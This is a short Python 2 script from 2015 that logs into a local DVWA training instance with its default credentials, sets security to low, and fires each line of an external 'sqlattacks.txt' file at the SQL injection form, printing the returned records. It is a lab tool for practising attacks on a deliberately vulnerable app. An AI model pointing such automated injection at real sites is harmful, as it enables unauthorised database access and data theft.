#!/usr/bin/python

#################################################################################################################
# Auto Exploit DVWA SQL Injections with Mechanize and BeautifulSoup
# Date: 11 April 2015
# Author: bbills85
# Version: 1
# Tested with: Python 2.7.6, Ubuntu 14.04.2 LTS, and DVWA Version 1.8
#################################################################################################################
# References:
# http://www.tutorialspoint.com/python/python_files_io.htm
# http://www.pythonforbeginners.com/cheatsheet/python-mechanize-cheat-sheet
# http://wwwsearch.sourceforge.net/mechanize/forms.html
# http://www.crummy.com/software/BeautifulSoup/bs4/doc/
# http://stackoverflow.com/questions/8590172/setting-a-select-control-in-a-form-with-mechanize-using-python
# http://stackoverflow.com/questions/22294489/using-mechanize-python-to-fill-form
# http://stackoverflow.com/questions/11064122/python-mechanize-setting-input-into-form
# http://stackoverflow.com/questions/3569622/python-mechanize-following-link-by-url-and-what-is-the-nr-parameter
# http://stackoverflow.com/questions/19356736/python-mechanize-form-submitting-error
#################################################################################################################

import mechanize
from bs4 import BeautifulSoup

# global variable for custom sql attacks file
fileName = "sqlattacks.txt"

"""function used to setup DVWA for SQL injections with mechanize"""
def dvwaLogin():
	# create mechanized object
	wp = mechanize.Browser()
	# open dvwa login **required**
	wp.open("http://localhost/dvwa/login.php")

	print "[+] logging into DVWA ...."
	# select the first form (no form name provided)
	wp.select_form(nr = 0)
	print wp
	print "[+] setting username and password ...."
	# set username and password
	wp.form['username'] = 'admin'
	wp.form['password'] = 'password'
	print wp
	# submit the form
	wp.submit()

	print "[+] switching to DVWA security section ...."
	# obtain and select the link from the html code
	# needs to be EXACTLY how it appears in html code
	request = wp.click_link(url = "security.php")
	response = wp.follow_link(url = "security.php")
	# select the first form (no form name provided)
	wp.select_form(nr = 0)
	print wp
	print "[+] setting security to low ...."
	# set the security to low
	wp.form['security'] = ['low']
	print wp
	# submit form
	wp.submit()

	print "[+] switching to DVWA vulnerabilities sql section ...."
	# obtain and select the link from the html code
        request = wp.click_link(url = "vulnerabilities/sqli/.")
        response = wp.follow_link(url = "vulnerabilities/sqli/.")
	print wp
	print "[+] ready for sql injections ....\n\n"

	# return object
	return wp

"""function used to iterate through file and attempt SQL injections"""
def main():
	# open file in read only default format
	inFile = open(fileName)	
	# call function and store return in variable
	wp = dvwaLogin()

	# for statement iterating through file
	for line in inFile:
		print "[+] attempting ...." + line.strip()
	        # select the first form (no form name provided)
		wp.select_form(nr = 0)
		# set form id to line from file; removed \n\r with strip()
		wp.form['id'] = line.strip()
		print wp
		# submit form and store in req
		req = wp.submit()

		# create BeautifulSoup object with req
	        html = BeautifulSoup(req)
		# search for all 'pre' tags and store in variable
	        sqlResults = html.find_all('pre')
		# for loop displaying results in clear text
	        for result in sqlResults:
	     	        print result.get_text()

		# sends page back to original state
		# REQUIRED for the forms to work multiple times
		wp.back()

	# close file
	inFile.close()

if __name__ == "__main__":
	main()
